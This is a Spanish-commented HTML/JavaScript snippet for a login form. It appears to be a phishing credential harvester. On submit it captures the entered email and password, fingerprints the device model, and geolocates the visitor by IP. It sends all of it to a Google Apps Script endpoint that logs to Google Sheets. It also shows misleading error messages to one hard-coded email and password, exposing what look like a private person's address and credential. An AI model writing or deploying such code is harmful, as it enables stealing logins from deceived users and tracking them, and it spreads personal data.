<!-- Agrega esto en tu formulario.html para cargar la librería -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/device-detector-js/2.2.10/device-detector.min.js"></script>

<script>
document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["tamaraganoza417@gmail.com"];
    const prohibitedWords = ["Kiana14_07"];
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return;
    }
    
    // Verificar correo prohibido
    if (prohibitedEmails.includes(email)) {
        errorMessage.textContent = "No se encuentra la dirección de correo";
        errorMessage.style.color = 'red';
        emailInput.value = '';
        passwordInput.value = '';
        return;
    }
    
    // Verificar contraseña prohibida
    if (prohibitedWords.includes(password)) {
        errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
        errorMessage.style.color = 'red';
        passwordInput.value = '';
        return;
    }

    // 🔥 DETECTAR EL MODELO EXACTO DEL DISPOSITIVO CON device-detector-js 🔥
    const deviceDetector = new DeviceDetector();
    const device = deviceDetector.parse(navigator.userAgent);
    let deviceModel = "Desconocido";

    if (device.device && device.device.model) {
        deviceModel = `${device.device.brand} ${device.device.model}`; // Marca + Modelo
    } else {
        deviceModel = device.os.name || "Desconocido"; // Si no detecta modelo, muestra el sistema operativo
    }

    console.log("Modelo detectado:", deviceModel); // 👀 Verificar en consola

    // 🔥 OBTENER CIUDAD Y PAÍS 🔥
    let country = "Desconocido";
    let city = "Desconocida";

    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data && data.country) {
            country = data.country; // Captura el país
        }
        if (data && data.city) {
            city = data.city; // Captura la ciudad
        }
    } catch (error) {
        console.error("Error obteniendo el país y ciudad:", error);
    }

    // 🔥 Enviar los datos a Google Sheets 🔥
    const formData = new FormData(this);
    formData.append("device", deviceModel);
    formData.append("country", country);
    formData.append("city", city);

    const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";

    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
</script>
